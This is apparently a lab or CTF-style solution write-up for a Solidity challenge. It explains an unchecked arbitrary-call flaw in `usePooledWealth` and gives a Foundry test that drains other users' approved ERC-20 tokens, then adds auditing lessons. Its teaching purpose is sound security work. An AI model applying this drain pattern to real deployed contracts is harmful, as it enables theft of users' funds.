# CallMeMaybe Solution
Hopefully you figure out that you can use the function `usePooledWealth` to steal the tokens. The line `_target.call(_calldata);` does not validate the target contract or the calldata. This allows us to call the ERC-20 token and approve ourselves. Since we are making the call from the smart contract, we are approving the smart contract to allow us to spend its tokens. To steal 600 tokens, first we need to transfer the tokens from the users who max approved the contract. Then we are free to approve ourselves to spend the tokens.

Here is my version of the exploit:
```
function test_GetThisPassing_2() public {
    address hacker = address(0xBAD);

    uint256 startBalance = token.balanceOf(hacker);

    vm.startPrank(hacker);

    // join the group
    token.approve(address(target), 1 ether);
    target.joinGroup(1 ether);

    // iterate through and transfer the other users' tokens to the contract
    for (uint256 i; i < users.length; i++) {
        address user = users[i];
        bytes memory _calldataTransfer = abi.encodeCall(token.transferFrom, (user, address(target), token.balanceOf(user)));
        target.usePooledWealth(_calldataTransfer, address(token));
    }

    // form our approve calldata
    bytes memory _calldataApprove = abi.encodeCall(token.approve, (hacker, type(uint256).max));
    
    // call the contract approving ourselves to spend the tokens
    target.usePooledWealth(_calldataApprove, address(token));

    // transfer out the tokens
    token.transferFrom(address(target), hacker, 601 ether);

    vm.stopPrank();
    assertGt(token.balanceOf(hacker), 300 ether);
}
```
To summarize here is the steps we needed to complete the hack:

1. Join the group so we have access to call `usePooledWealth`.

2. Loop through each user transferring their tokens to the smart contract via `usePooledWealth`.

3. Use `usePooledWealth` to call `approve` on the ERC20 token.

4. Use `transferFrom` to steal the tokens from the contract.


I would like to point out that we stole address(0x03)'s tokens even though they were no longer a part of the group. This is why it is dangerous to max approve a smart contract!

This exploit is special to me as I found one in my first C4 contest. Hopefully, you now know to check for similar bugs when you see a smart contract use `call` with user inputted calldata!
